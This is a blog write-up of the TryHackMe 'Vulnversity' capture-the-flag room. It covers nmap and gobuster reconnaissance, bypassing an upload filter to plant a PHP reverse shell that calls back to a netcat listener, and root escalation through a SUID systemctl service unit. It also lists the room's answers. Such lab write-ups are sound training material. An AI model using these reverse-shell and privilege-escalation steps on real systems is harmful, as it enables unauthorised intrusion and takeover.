---
title: TryHackMe - Vulnversity
layout: post
categories:
- TryHackMe
tag:
- recon,
- privesc,
- webappsec
image: "/assets/img/vulnversity.png"
image_alt: vulversity
---

This is an easy CTF. Let's start.

<br>

## 1. Deploy the machine 

Connect to our network and deploy this machine. If you are unsure on how to get connected, complete the OpenVPN room first.

<br>

---

<br>

## 2. Reconnaissance  

Now that you’ve found the code for the backdoor, it’s time to analyse it.
Gather information about this machine using a network scanning tool called `nmap`.

<br>

### 2.1 Scan the box, how many ports are open?

Let's find out how many ports are open on the target with a simple `nmap` scan.

```
$ nmap -sSV 10.10.56.244
```

![nmap](/assets/img/tryhackme/vulnversity/nmap.png)

**Answer: `6`**

<br>

### 2.2 What version of the squid proxy is running on the machine?

As you may have noticed from the previous question, squid proxy is http-proxy running on port `3128/tcp`.

**Answer: `3.5.12`**

<br>

### 2.3 How many ports will nmap scan if the flag -p-400 was used?

**Answer: `400`**

<br>

### 2.4 Using the nmap flag -n what will it not resolve?

**Answer: `DNS`**

<br>

### 2.5 What is the most likely operating system this machine is running?

**Answer: `ubuntu`**

<br>

### 2.6 What port is the web server running on?

**Answer: `3333`**

<br>

---

<br>

## 3. Locating directories using GoBuster 

Using a fast directory discovery tool called GoBuster you will locate a directory that you can use to upload a shell to.

<br>

### 3.1 What is the directory that has an upload form page?

Now, let's do a directory scan using `gobuster`.

```
`$ gobuster dir -u http://10.10.56.244:3333/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
```

![gobuster](/assets/img/tryhackme/vulnversity/gobuster.png)

**Answer: `/internal/`**

<br>

---

<br>

## 4. Compromise the webserver   

Now you have found a form to upload files, we can leverage this to upload and execute our payload that will lead to compromising the web server.

<br>

### 4.1 What common file type, which you'd want to upload to exploit the server, is blocked? Try a couple to find out.

I downloaded and tried pentest monkey's php-reverse-shell.php file, but it didn't upload.
[php-reverse-shell.php](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)

![error](/assets/img/tryhackme/vulnversity/error.png)

**Answer: `.php`**

<br>

### 4.2 Run this attack, what extension is allowed?

Since the .php extension does not work here, we need to try other php extensions instead. If you want, you can do it manually or by using burp suite as tryhackme explained, I don't see the need to use burp suite for now. 

![success](/assets/img/tryhackme/vulnversity/success.png)

**Answer: `.phtml`**

<br>

### 4.3 What is the name of the user who manages the webserver?

Now we edit the reverse shell (we adjust the ip and port parts according to ourselves) and upload it. 

![set](/assets/img/tryhackme/vulnversity/set.png)

Then we open a listener for the port we wrote in the shell using `netcat`.

```
$ nc -nlvp 4444
```

Then we visit the shell that we uploaded to the target site. 

```
$ http://10.10.56.244:3333/internal/uploads/shell.phtml
```

And we are inside.

![in](/assets/img/tryhackme/vulnversity/in.png)

Now, to find out who the user is, we go to the `/home` directory and list the files using the `ls -la` command. There should be a folder with the user's name here.

![bill](/assets/img/tryhackme/vulnversity/bill.png)

**Answer: `bill`**

<br>

### 4.4 What is the user flag?

Now we open the `user.txt` owned by the user, Bill.

```
$ cat /home/bill/user.txt
```

![user-flag](/assets/img/tryhackme/vulnversity/user-flag.png)

<br>

---

<br>

## 5. Privilege Escalation    

Now you have compromised this machine, we are going to escalate our privileges and become the superuser (root).

<br>

### 5.1 On the system, search for all SUID files. What file stands out?

_Hint: Use the command: find / -user root -perm -4000 -print 2>/dev/null_

![find](/assets/img/tryhackme/vulnversity/find.png)

**Answer: `/bin/systemctl`**

<br>

### 5.2 Become root and get the last flag (/root/root.txt).

_Hint: /bin/systemctl_

Let's enter the following codes one by one to raise privileges and access root.txt.

```
$ cat > /tmp/flag.service << EOF
> [Service]
> ExecStart=/bin/bash -c "cat /root/root.txt > /tmp/flag.txt"
> [Install]
> WantedBy=multi-user.target
> EOF
$ /bin/systemctl link /tmp/flag.service
$ /bin/systemctl enable --now /tmp/flag.service
$ cat /tmp/flag.txt 
```

![root-flag](/assets/img/tryhackme/vulnversity/root-flag.png)

<br>

It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.

<br>
